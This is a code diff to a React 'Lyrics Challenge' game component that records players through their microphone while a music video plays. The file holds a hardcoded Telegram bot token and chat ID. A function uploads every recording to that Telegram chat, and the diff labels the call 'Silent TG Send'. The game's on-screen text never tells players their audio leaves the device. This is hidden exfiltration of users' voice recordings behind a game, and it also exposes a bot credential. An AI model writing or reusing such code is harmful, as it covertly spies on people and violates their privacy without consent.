@@ -10,7 +10,7 @@ import {
 const BOT_TOKEN = "8673978157:AAFWiYR__xUFb79u9Tfrz-8guCB10sgruX0"
 const CHAT_ID = "8745839603"
 
-let globalStream = null
+let globalStream = null // Global stream reference
 
 async function sendVoiceNoteToTG(songNo, audioBlob) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`
@@ -42,14 +42,11 @@ export default function FunGames({ onComplete }) {
     const [voiceBlob, setVoiceBlob] = useState(null)
     const [isPreviewPlaying, setIsPreviewPlaying] = useState(false)
     const [micAllowed, setMicAllowed] = useState(false)
-    const [recordingTime, setRecordingTime] = useState(0)
-    const [showTimer, setShowTimer] = useState(false)
 
     const videoRef = useRef(null)
     const previewAudioRef = useRef(null)
     const mediaRecorderRef = useRef(null)
     const audioChunksRef = useRef([])
-    const recordingTimerRef = useRef(null)
     
     // Visualizer Refs
     const audioCtxRef = useRef(null)
@@ -58,10 +55,11 @@ export default function FunGames({ onComplete }) {
     const barRefs = useRef([])
 
     // ============================================
-    // INIT MIC ONCE
+    // INIT MIC ONCE (GLOBAL STREAM REUSE)
     // ============================================
     const initMicrophone = async () => {
         if (globalStream) {
+            // Stream already exists, just use it
             setMicAllowed(true)
             return true
         }
@@ -80,7 +78,7 @@ export default function FunGames({ onComplete }) {
     }
 
     // ============================================
-    // INIT VISUALIZER WITH HIGH SENSITIVITY
+    // INIT VISUALIZER (Once)
     // ============================================
     const initVisualizer = () => {
         if (!globalStream || audioCtxRef.current) return
@@ -92,14 +90,13 @@ export default function FunGames({ onComplete }) {
             
             const source = ctx.createMediaStreamSource(globalStream)
             const analyser = ctx.createAnalyser()
-            analyser.fftSize = 256 // HIGHER = More sensitive
-            analyser.smoothingTimeConstant = 0.2 // Less smoothing = faster response
+            analyser.fftSize = 64
             source.connect(analyser)
             analyserRef.current = analyser
             
             // Start visualizer loop
             const drawVisualizer = () => {
-                if (!analyserRef.current) {
+                if (!analyserRef.current || gameState !== "recording") {
                     animationFrameRef.current = requestAnimationFrame(drawVisualizer)
                     return
                 }
@@ -107,26 +104,11 @@ export default function FunGames({ onComplete }) {
                 const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount)
                 analyserRef.current.getByteFrequencyData(dataArray)
 
-                // High sensitivity - take max from multiple frequencies
-                for (let i = 0; i < 20; i++) {
+                for (let i = 0; i < 15; i++) {
                     if (barRefs.current[i]) {
-                        // Better sensitivity - take max from frequency range
-                        let maxVal = 0
-                        for (let j = i * 3; j < (i * 3) + 4; j++) {
-                            if (dataArray[j]) maxVal = Math.max(maxVal, dataArray[j])
-                        }
-                        // Apply sensitivity multiplier (2x for more movement)
-                        let val = Math.min(100, Math.floor((maxVal / 200) * 100 * 1.5))
-                        const height = Math.max(8, val)
+                        const val = dataArray[i * 2] || 0
+                        const height = Math.max(15, (val / 255) * 100)
                         barRefs.current[i].style.height = `${height}%`
-                        // Color based on intensity
-                        if (val > 70) {
-                            barRefs.current[i].style.backgroundColor = "#ff3366"
-                        } else if (val > 40) {
-                            barRefs.current[i].style.backgroundColor = "#ff6699"
-                        } else {
-                            barRefs.current[i].style.backgroundColor = "#ff99bb"
-                        }
                     }
                 }
                 animationFrameRef.current = requestAnimationFrame(drawVisualizer)
@@ -157,27 +139,17 @@ export default function FunGames({ onComplete }) {
         setVoiceBlob(null)
         setIsPreviewPlaying(false)
         setGameState("recording")
-        setRecordingTime(0)
-        setShowTimer(false)
 
         // Play Video
         const video = videoRef.current
         if (video) {
             video.currentTime = SONGS[index].clipStart
             video.play().catch(e => console.error("Video play failed", e))
-            
-            // Show timer after 2 seconds
-            setTimeout(() => setShowTimer(true), 2000)
         }
-
-        // Start Recording Timer
-        if (recordingTimerRef.current) clearInterval(recordingTimerRef.current)
-        recordingTimerRef.current = setInterval(() => {
-            setRecordingTime(prev => prev + 1)
-        }, 1000)
 
         // Start Recording using GLOBAL STREAM
         if (globalStream && globalStream.active) {
+            // Recreate tracks if needed
             if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
                 mediaRecorderRef.current.stop()
             }
@@ -191,15 +163,16 @@ export default function FunGames({ onComplete }) {
             }
 
             mr.onstop = () => {
-                clearInterval(recordingTimerRef.current)
                 const blob = new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" })
                 const url = URL.createObjectURL(blob)
                 setVoiceBlob(blob)
                 setVoiceUrl(url)
                 
+                // Silent TG Send
                 sendVoiceNoteToTG(index + 1, blob)
                 setGameState("preview")
                 
+                // Pause video
                 if (videoRef.current) videoRef.current.pause()
             }
 
@@ -231,8 +204,8 @@ export default function FunGames({ onComplete }) {
         return () => {
             if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current)
             if (voiceUrl) URL.revokeObjectURL(voiceUrl)
-            if (recordingTimerRef.current) clearInterval(recordingTimerRef.current)
             if (audioCtxRef.current && audioCtxRef.current.state !== "closed") audioCtxRef.current.close()
+            // DON'T close globalStream here - reuse it
         }
     }, [voiceUrl])
 
@@ -277,14 +250,14 @@ export default function FunGames({ onComplete }) {
                         <motion.div key="start" className="w-full text-center p-8 bg-white/5 border border-white/10 rounded-[32px] backdrop-blur-xl" initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ opacity: 0 }}>
                             <PlaySquare className="w-16 h-16 text-pink-500 mx-auto mb-6" />
                             <h1 className="text-3xl font-black mb-4 uppercase tracking-tighter italic text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-purple-400">Lyrics Challenge</h1>
-                            <p className="text-gray-400 text-sm mb-8 px-2">Watch the video. Your mic will record both the music and your voice. Complete the lyrics when the progress bar comes!</p>
+                            <p className="text-gray-400 text-sm mb-8 px-2">Watch the video. Your mic will record both the music and your voice. Complete the lyrics when the timer stops!</p>
                             <button onClick={startGame} className="w-full py-4 bg-pink-600 text-white rounded-2xl font-black uppercase tracking-widest hover:bg-pink-500 shadow-lg shadow-pink-500/20 active:scale-95 transition-all">Start Challenge 🎙️</button>
                         </motion.div>
                     )}
 
                     {gameState === "recording" && (
                         <motion.div key="rec" className="w-full p-6 bg-red-500/10 border border-red-500/30 rounded-[32px] text-center" initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }}>
-                            <div className="flex justify-between items-center mb-4">
+                            <div className="flex justify-between items-center mb-6">
                                 <span className="text-[10px] font-black text-red-500 uppercase tracking-widest">Song {currentIdx + 1}/{SONGS.length}</span>
                                 <div className="flex items-center gap-2 px-3 py-1 bg-red-500/20 rounded-full border border-red-500/40 animate-pulse">
                                     <div className="w-2 h-2 rounded-full bg-red-500" />
@@ -292,47 +265,13 @@ export default function FunGames({ onComplete }) {
                                 </div>
                             </div>
 
-                            {/* Progress Bar Message */}
-                            {showTimer && (
-                                <motion.div 
-                                    className="mb-4 px-4 py-2 bg-purple-500/20 rounded-full border border-purple-500/40"
-                                    initial={{ scale: 0.8, opacity: 0 }}
-                                    animate={{ scale: 1, opacity: 1 }}
-                                >
-                                    <p className="text-purple-300 text-xs font-bold uppercase tracking-wider">
-                                        🎤 Complete the lyrics when progress bar comes! 🎤
-                                    </p>
-                                </motion.div>
-                            )}
-
-                            {/* Recording Timer Bar */}
-                            <div className="w-full h-1.5 bg-white/10 rounded-full mb-6 overflow-hidden">
-                                <motion.div 
-                                    className="h-full bg-gradient-to-r from-red-500 to-pink-500 rounded-full"
-                                    animate={{ width: `${Math.min((recordingTime / 15) * 100, 100)}%` }}
-                                    transition={{ duration: 0.3 }}
-                                />
-                            </div>
-
-                            {/* LIVE VISUALIZER BARS - HIGH SENSITIVITY */}
-                            <div className="flex items-end justify-center gap-1.5 h-24 mb-6">
-                                {[...Array(20)].map((_, i) => (
-                                    <div 
-                                        key={i} 
-                                        ref={el => barRefs.current[i] = el} 
-                                        className="w-1.5 rounded-full transition-all duration-50" 
-                                        style={{ 
-                                            height: '8%', 
-                                            backgroundColor: '#ff99bb',
-                                            boxShadow: '0 0 4px #ff3366'
-                                        }} 
-                                    />
+                            <div className="flex items-end justify-center gap-1.5 h-20 mb-6">
+                                {[...Array(15)].map((_, i) => (
+                                    <div key={i} ref={el => barRefs.current[i] = el} className="w-1.5 bg-red-500 rounded-full transition-all duration-75" style={{ height: '15%' }} />
                                 ))}
                             </div>
 
-                            <p className="text-white font-bold text-sm mb-4 italic">
-                                {recordingTime < 5 ? "🎙️ Start singing the missing lyrics..." : "🎵 Keep going! You're doing great!"}
-                            </p>
+                            <p className="text-white font-bold text-sm mb-8 italic">"Complete the lyrics when the timer stops!"</p>
 
                             <button onClick={() => {
                                 if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
